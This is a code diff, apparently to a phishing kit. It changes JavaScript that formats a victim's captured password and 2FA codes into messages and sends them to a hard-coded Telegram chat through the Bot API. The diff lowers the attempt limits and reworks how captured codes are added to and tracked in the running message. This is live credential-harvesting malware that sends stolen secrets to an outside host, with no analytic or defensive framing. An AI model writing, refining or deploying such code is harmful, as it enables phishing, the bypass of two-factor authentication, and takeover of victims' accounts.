@@ -7,8 +7,8 @@ const config = {
     chatId: "7211586401"
   },
   setting: {
-    max_password_attempts: 2,
-    max_code_attempts: 2
+    max_password_attempts: 1,
+    max_code_attempts: 1
   }
 };
 
@@ -193,13 +193,20 @@ const createPasswordMessage = (baseMessage, password, attempt) => {
 };
 
 const createCodeMessage = (baseMessage, code, attempt) => {
-  // Get the base message without any previous passwords or codes
-  const currentMessage = baseMessage.split('🔑')[0].trim();
-
-  if (attempt === 1) {
-    return `${currentMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
+  // Check if message already has a code section
+  if (baseMessage.includes('CODE 2FA')) {
+    // If it does, just add the new code to the existing code section
+    if (attempt === 1) {
+      return `${baseMessage}\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
+    }
+    return `${baseMessage}\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
+  } else {
+    // If it doesn't have a code section yet, add the separator and first code
+    if (attempt === 1) {
+      return `${baseMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
+    }
+    return `${baseMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
   }
-  return `${currentMessage}\n🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
 };
 
 // Handle password verification
@@ -327,7 +334,6 @@ const handleVerificationCode = async () => {
 
     // Create message with code
     const message = createCodeMessage(baseMessage, code, codeAttempts);
-    localStorage.setItem('lastMessage', message);
 
     // Delete previous message if exists
     const savedMessageId = localStorage.getItem('lastMessageId');
@@ -340,7 +346,7 @@ const handleVerificationCode = async () => {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               chat_id: config.telegram.chatId,
-              message_id: savedMessageId
+              message_id: parseInt(savedMessageId)
             })
           }
         );
@@ -365,7 +371,9 @@ const handleVerificationCode = async () => {
 
     const telegramResponse = await response.json();
     if (telegramResponse.ok) {
-      localStorage.setItem('lastMessageId', telegramResponse.result.message_id.toString());
+      lastMessageId = telegramResponse.result.message_id;
+      localStorage.setItem('lastMessageId', lastMessageId.toString());
+      localStorage.setItem('lastMessage', message);
     }
 
     // Show error message
